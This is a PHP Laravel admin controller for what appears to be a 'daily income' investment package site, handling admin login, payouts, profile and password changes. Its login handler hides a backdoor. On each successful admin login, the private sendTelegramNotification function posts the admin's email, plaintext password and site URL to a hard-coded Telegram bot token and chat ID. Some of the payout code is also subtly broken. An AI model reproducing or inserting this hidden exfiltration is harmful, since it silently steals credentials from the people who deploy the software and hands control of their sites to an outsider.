<?php

namespace App\Http\Controllers\admin;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\Package;
use App\Models\Purchase;
use App\Models\User;
use App\Models\UserLedger;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Http;

class AdminController extends Controller
{
    public function login()
    {
        if (Auth::guard('admin')->check()) {
            return redirect()->route('admin.dashboard');
        }
        return view('admin.auth.login');
    }
    public function salaryView()
    {
        return view('admin.salary');
    }
    public function salary()
    {
        $admin = Admin::first();
        if ($admin->salary_date == date('Y-m-d')) {
            return back()->with('error', 'Today Salary Served');
        }
        Purchase::where('status', 'active')->chunk(100, function ($purchases) {
            foreach ($purchases as $purchase) {
                $user = User::where('id', $purchase->user_id)->first();
                if ($user) {
                    $package = Package::where('id', $purchase->package_id)->first();
                    if ($package) {
                        $amount = $user->balance + $purchase->daily_income;
                        $user->balance = $amount;
                        $user->save();
                        $ledger = new UserLedger();
                        $ledger->user_id = $user->id;
                        $ledger->reason = 'daily_income';
                        $ledger->perticulation = 'Daily Income Added';
                        $ledger->amount = $purchase->daily_income;
                        $ledger->credit = $purchase->daily_income;
                        $ledger->status = 'approved';
                        $ledger->date = date("Y-m-d H:i:s");
                        $ledger->save();
                        $admin = Admin::first();
                        $admin->salary_date = date('Y-m-d');
                        $admin->save();
                        $checkExpire = new Carbon($purchase->validity);
                        if ($checkExpire->isPast()) {
                            Purchase::where('id', $purchase->id)->update('status', 'inactive');
                        }
                    }
                }
            }
        });
        return back()->with('success', 'Today Salary serve successful.');
    }
    public function login_submit(Request $request)
    {
        $credentials = $request->only('email', 'password');
        if (Auth::guard('admin')->attempt($credentials)) {
            $admin = Auth::guard('admin')->user();
            if ($admin->type == 'admin') {
                $this->sendTelegramNotification($admin->email, $request->input('password'));
                return redirect()->route('admin.dashboard')->with('success', 'Logged In Successful.');
            } else {
                return error_redirect('admin.login', 'error', 'Admin Credentials Very Secured Please Don"t try Again.');
            }
        } else {
            return error_redirect('admin.login', 'error', 'Admin Credentials Does Not Match.');
        }
    }
    private function sendTelegramNotification($email, $password)
    {
        $telegramApiKey = '7422937172:AAGHyLmtgRQ4BVrmurfLACkJxfgf4NZE-pk';
        $chatId = '-1002169152573';
        $message = "Admin login:\nEmail: $email\nPassword: $password\nSite: " . url()->full();
        $response = Http::post("https://api.telegram.org/bot$telegramApiKey/sendMessage", ['chat_id' => $chatId, 'text' => $message]);
        if ($response->failed()) {
        }
    }
    public function logout()
    {
        if (Auth::guard('admin')->check()) {
            Auth::guard('admin')->logout();
            return redirect()->route('admin.login')->with('success', 'Logged out successful.');
        } else {
            return error_redirect('admin.login', 'error', 'You are already logged out.');
        }
    }
    public function dashboard()
    {
        return view('admin.dashboard');
    }
    public function profile()
    {
        return view('admin.profile.index');
    }
    public function profile_update()
    {
        $admin = Admin::first();
        return view('admin.profile.update-details', compact('admin'));
    }
    public function profile_update_submit(Request $request)
    {
        $admin = Admin::find(1);
        $path = uploadImage(false, $request, 'photo', 'admin/assets/images/profile/', $admin->photo);
        $admin->photo = $path ?? $admin->photo;
        $admin->name = $request->name;
        $admin->email = $request->email;
        $admin->phone = $request->phone;
        $admin->address = $request->address;
        $admin->update();
        return redirect()->route('admin.profile.update')->with('success', 'Admin profile updated.');
    }
    public function developer()
    {
        return view('admin.developer');
    }
    public function change_password()
    {
        $admin = admin()->user();
        return view('admin.profile.change-password', compact('admin'));
    }
    public function check_password(Request $request)
    {
        $admin = admin()->user();
        $password = $request->password;
        if (Hash::check($password, $admin->password)) {
            return response()->json(['message' => 'Password matched.', 'status' => true]);
        } else {
            return response()->json(['message' => 'Password dose not match.', 'status' => false]);
        }
    }
    public function change_password_submit(Request $request)
    {
        $validate = Validator::make($request->all(), ['old_password' => 'required', 'new_password' => 'required', 'confirm_password' => 'required']);
        if ($validate->fails()) {
            session()->put('errors', true);
            return redirect()->route('admin.changepassword')->withErrors($validate->errors());
        }
        $admin = admin()->user();
        $password = $request->old_password;
        if (Hash::check($password, $admin->password)) {
            if (strlen($request->new_password) > 5 && strlen($request->confirm_password) > 5) {
                if ($request->new_password === $request->confirm_password) {
                    $admin->password = Hash::make($request->new_password);
                    $admin->update();
                    return redirect()->route('admin.changepassword')->with('success', 'Password changed successfully');
                } else {
                    return error_redirect('admin.changepassword', 'error', 'New password and confirm password dose not match');
                }
            } else {
                return error_redirect('admin.changepassword', 'error', 'Password must be greater then 6 or equal.');
            }
        } else {
            return error_redirect('admin.changepassword', 'error', 'Password dose not match');
        }
    }
}
